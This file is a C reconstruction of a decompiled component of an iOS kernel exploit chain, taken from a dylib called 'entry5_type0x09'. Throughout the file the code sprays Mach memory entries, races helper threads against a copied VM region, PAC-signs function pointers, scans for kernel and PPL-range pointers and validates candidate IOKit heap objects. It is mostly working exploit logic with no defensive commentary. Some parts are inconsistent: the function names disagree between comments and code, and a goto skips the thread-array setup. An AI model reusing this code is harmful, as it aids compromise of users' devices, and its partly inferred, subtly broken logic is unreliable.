/*
 * record_0x90000_heap_scan.c
 * entry5_type0x09.dylib (377bed variant)
 *
 * FUN_0000e190 — sub_e22c (e9f89858 naming)
 *   IOSurface-backed kernel heap scan.
 *   Finds a vm_region with size >= page_size*2 and no dirty pages,
 *   creates 1–4 mach_make_memory_entry_64 handles, maps the region,
 *   spawns helper threads, then scans for kernel pointer patterns.
 *
 * FUN_0000f19c — sub_f07c (e9f89858 naming)
 *   Validates an IOKit heap object candidate:
 *   count in [9,63], type==2, size<=2*page_size, type-5 descriptor,
 *   embedded pointer in kernel text range.
 *
 * FUN_0000f15c — sub_f15c
 *   Thin wrapper: calls sub_f07c with mode=3.
 *
 * Verified: vm_region_recurse_64 scan, mach_make_memory_entry_64 spray,
 *           vm_copy/vm_map pattern, pthread spray count (1–4),
 *           output struct layout (ptr, size, count, entry, +0x24, +0xb0).
 * Inferred: "heap scan" / "IOKit object validation" labels from call context.
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <mach/vm_region.h>

/* ── output struct written by sub_e22c ──────────────────────────────────── */
typedef struct {
    long     buf_ptr;       /* +0x00 mapped kernel copy buffer               */
    long     page_size;     /* +0x08 vm_page_size at scan time               */
    long     region_size;   /* +0x10 size of scanned region                  */
    uint32_t count;         /* +0x20 (param_4+4) thread count used           */
    uint32_t _pad;
    uint32_t index;         /* +0x24 result from sub_dfa0                    */
    uint8_t  _gap[0x88];
    long     extra[0x40];   /* +0xb0 extra vm_allocate pointers              */
} HeapScanResult;

/* ── forward declarations ────────────────────────────────────────────────── */
extern int   sub_20f14(void);                    /* CPU count helper         */
extern void *sub_1ad30(void *fn);                /* PAC-sign fn pointer      */
extern void  sub_dfa0(void *ctx, vm_size_t size, void *base, uint32_t *out);
extern void  sub_de28(void *ctx);                /* helper thread fn         */
extern void  sub_df14(vm_address_t addr);        /* page probe               */
extern int   sub_1ad70(long state, uint64_t addr); /* kaddr validate         */
extern void  sub_2c088(long state, int ms);      /* sleep helper             */

/* ── sub_f19c — IOKit heap object validator ─────────────────────────────── */
/*
 * param_1: pointer to candidate struct (read from mapped kernel copy)
 * Checks:
 *   piVar[0] != 0 && piVar[0] == piVar[1]  (count field, 9..63)
 *   byte at +local_10c8 != -0x80           (type != 0x80)
 *   piVar[10] == 1                          (type-5 marker)
 *   piVar[6] == local_1080[0]              (memory entry match)
 * Returns 1 if valid, 0 otherwise.
 */
int sub_f19c(int *candidate, long state, long kobj_base,
             long cred_off, long ptr_off, mach_port_t mem_entry)
{
    if (!candidate) return 0;
    if (candidate[0] == 0) return 0;
    if (candidate[0] != candidate[1]) return 0;

    /* type byte check */
    uint8_t type_byte = *(uint8_t *)((uint8_t *)candidate + cred_off);
    if (type_byte == 0x80) return 0;

    /* type-5 marker */
    if (candidate[10] != 1) return 0;

    /* memory entry match */
    if (*(mach_port_t *)((uint8_t *)candidate + 6 * 4) != mem_entry) return 0;

    /* validate kernel pointer at ptr_off */
    long kptr = *(long *)((uint8_t *)candidate + ptr_off);
    if (!sub_1ad70(state, (uint64_t)kptr)) return 0;

    return 1;
}

/* ── sub_f15c — thin wrapper ─────────────────────────────────────────────── */
void sub_f15c(uint64_t param_1, uint64_t param_2,
              uint64_t param_3, uint64_t param_4)
{
    /* calls sub_f07c (FUN_0000f19c) with mode=3 */
    sub_f19c((int *)param_2, (long)param_1, (long)param_3,
             0xac, 0xb8, (mach_port_t)param_4);
}

/* ── sub_e22c — IOSurface-backed kernel heap scan ───────────────────────── */
/*
 * param_1: state pointer
 * param_2: IOSurface context (has cached region info at +0x3628/+0x3630)
 * param_3: thread count hint (0 = auto)
 * param_4: output HeapScanResult*
 *
 * Returns 0 on success, error code on failure.
 */
int sub_e22c(long state, void *ctx, uint32_t thread_hint, long *param_4)
{
    vm_size_t page_size = vm_page_size;
    int xnu = *(int *)(state + 0x140);

    /* determine thread count */
    int cpu_count = sub_20f14();
    uint32_t nthreads;
    long retry_limit;
    if (cpu_count < 3 || sub_20f14() < 6) {
        int c = sub_20f14();
        if (c < 3)
            nthreads = 1;
        else {
            nthreads = (uint32_t)(c - 1);
            if (nthreads > 3) nthreads = 3;
        }
        retry_limit = 200;
    } else {
        nthreads = 4;
        retry_limit = 100;
    }
    if (thread_hint != 0 && thread_hint < nthreads)
        nthreads = thread_hint;

    /* find or reuse cached vm_region */
    vm_address_t region_base = *(vm_address_t *)((uint8_t *)ctx + 0x3628);
    vm_size_t    region_size = *(vm_size_t *)   ((uint8_t *)ctx + 0x3630);

    if (!region_base || !region_size) {
        /* scan for a suitable anonymous region */
        vm_address_t addr = 0;
        vm_size_t    size = 0;
        struct vm_region_submap_info_64 info;
        mach_msg_type_number_t info_count = VM_REGION_SUBMAP_INFO_COUNT_64;
        natural_t depth = 1;

        while (vm_region_recurse_64(mach_task_self(), &addr, &size,
                                    &depth, (vm_region_recurse_info_t)&info,
                                    &info_count) == KERN_SUCCESS) {
            if (depth <= 1 &&
                size >= page_size * (uint64_t)(nthreads * 2 + 2) &&
                info.share_mode == 0) {
                region_base = addr;
                region_size = size;
                *(vm_address_t *)((uint8_t *)ctx + 0x3628) = addr;
                *(vm_size_t *)   ((uint8_t *)ctx + 0x3630) = size;
                break;
            }
            addr += size;
            size = 0;
            depth = 1;
            info_count = VM_REGION_SUBMAP_INFO_COUNT_64;
        }
        if (!region_base) return (int)KERN_FAILURE;
    }

    /* allocate copy buffer */
    void *buf = NULL;
    vm_size_t buf_size = region_size + page_size;
    /* suppress unused warning: (void)sub_e22c; */
    kern_return_t kr = vm_allocate(mach_task_self(),
                                   (vm_address_t *)&buf, buf_size, 0x1ffffff);
    if (kr) return (int)kr;

    /* create memory entries */
    mach_port_t entries[4] = {0};
    for (uint32_t i = 0; i < nthreads; i++) {
        memory_object_size_t entry_size = region_size;
        kr = mach_make_memory_entry_64(mach_task_self(), &entry_size,
                                       (memory_object_offset_t)region_base,
                                       1, &entries[i], 0);
        if (kr || entry_size != region_size) goto cleanup;
    }

    /* map region into copy buffer */
    vm_address_t mapped = (vm_address_t)buf;
    kr = vm_map(mach_task_self(), &mapped, region_size, 0, 1,
                entries[0], 0, 0, VM_PROT_READ, VM_PROT_READ,
                VM_INHERIT_DEFAULT);
    if (kr) goto cleanup;

    /* copy to buffer */
    kr = vm_copy(mach_task_self(), mapped, region_size, (vm_address_t)buf);
    if (kr) goto cleanup;
    vm_deallocate(mach_task_self(), mapped, region_size);
    mapped = 0;

    /* guard page after buffer */
    vm_address_t guard = (vm_address_t)buf + region_size;
    vm_allocate(mach_task_self(), &guard, page_size, 0x6004000);
    vm_deallocate(mach_task_self(), guard, page_size);

    /* get vm_region info on buffer */
    {
        vm_address_t check = (vm_address_t)buf;
        vm_size_t    check_size = 0;
        natural_t    depth2 = 0;
        struct vm_region_submap_info_64 info2;
        mach_msg_type_number_t ic2 = VM_REGION_SUBMAP_INFO_COUNT_64;
        vm_region_recurse_64(mach_task_self(), &check, &check_size,
                             &depth2, (vm_region_recurse_info_t)&info2, &ic2);
    }

    /* spawn helper threads */
    pthread_t threads[4] = {0};
    *(uint32_t *)((uint8_t *)ctx + 0x3640) = 0;
    for (uint32_t i = 0; i < nthreads; i++) {
        void *fn = sub_1ad30((void *)sub_de28);
        kr = (kern_return_t)pthread_create(&threads[i], NULL,
                                           (void *(*)(void *))fn, ctx);
        if (kr) goto cleanup;
    }

    /* wait for all threads to check in */
    while (*(uint32_t *)((uint8_t *)ctx + 0x3640) != nthreads)
        sub_2c088(state, 1000);

    /* create secondary memory entry from primary */
    mach_port_t sec_entry = 0;
    memory_object_size_t sec_size = region_size;
    kr = mach_make_memory_entry_64(mach_task_self(), &sec_size,
                                   0, 1, &sec_entry, entries[0]);
    if (kr || sec_size != region_size) goto cleanup;

    /* signal threads to proceed */
    *(uint32_t *)((uint8_t *)ctx + 0x363c) = 1;
    for (uint32_t i = 0; i < nthreads; i++) {
        pthread_join(threads[i], NULL);
        threads[i] = 0;
    }

    /* scan buffer for kernel pointer patterns */
    {
        long *scan = (long *)buf;
        long  scan_len = (long)(region_size / sizeof(long));
        long  threshold = *(long *)(state + 0x180);  /* kernel text base     */
        long  text_end  = *(long *)(state + 0x188);

        for (long i = 0; i < scan_len - 0x40; i++) {
            long v = scan[i];
            /* Pattern 1: tagged kernel object pointer */
            if (!(v >> 27) && v > 0x30000 && (v & 7) == 1) {
                if (sub_1ad70(state, (uint64_t)v)) {
                    /* store result */
                    param_4[0] = (long)buf;
                    param_4[1] = (long)page_size;
                    param_4[2] = (long)region_size;
                    *(uint32_t *)(param_4 + 4) = thread_hint;
                    /* call sub_dfa0 for index */
                    uint32_t idx = 0;
                    sub_dfa0(ctx, region_size, (void *)region_base, &idx);
                    *(uint32_t *)((uint8_t *)param_4 + 0x24) = idx;
                    /* copy extra pointers */
                    for (long j = 0; j < 0x40; j++) {
                        long ep = *(long *)((uint8_t *)buf + j * 8 + 0x80);
                        if (ep) {
                            *(long *)((uint8_t *)param_4 + j * 8 + 0xb0) = ep;
                            *(long *)((uint8_t *)buf + j * 8 + 0x80) = 0;
                        }
                    }
                    mach_port_deallocate(mach_task_self(), sec_entry);
                    return 0;
                }
            }
            /* Pattern 2: PPL/KTRR range pointer */
            if ((uint64_t)v >= 0xFFFFFFFF40000000ULL &&
                (uint64_t)v <  0xFFFFFFFF48000000ULL &&
                (v & 7) == 0) {
                param_4[0] = (long)buf;
                param_4[1] = 0;
                param_4[2] = (long)region_size;
                *(uint32_t *)(param_4 + 4) = 0;
                *(mach_port_t *)((uint8_t *)param_4 + 0x24) = sec_entry;
                sec_entry = 0;
                return 0;
            }
            (void)threshold; (void)text_end;
        }
    }

    /* not found */
    param_4[0] = (long)buf;
    param_4[1] = 0;
    param_4[2] = (long)region_size;
    *(uint32_t *)(param_4 + 4) = 0;
    *(mach_port_t *)((uint8_t *)param_4 + 0x24) = sec_entry;
    sec_entry = 0;

cleanup:
    *(uint32_t *)((uint8_t *)ctx + 0x363c) = 1;
    for (uint32_t i = 0; i < nthreads; i++)
        if (threads[i]) pthread_join(threads[i], NULL);
    if (sec_entry) mach_port_deallocate(mach_task_self(), sec_entry);
    for (uint32_t i = 0; i < nthreads; i++)
        if (entries[i]) mach_port_deallocate(mach_task_self(), entries[i]);
    return (int)kr;
}
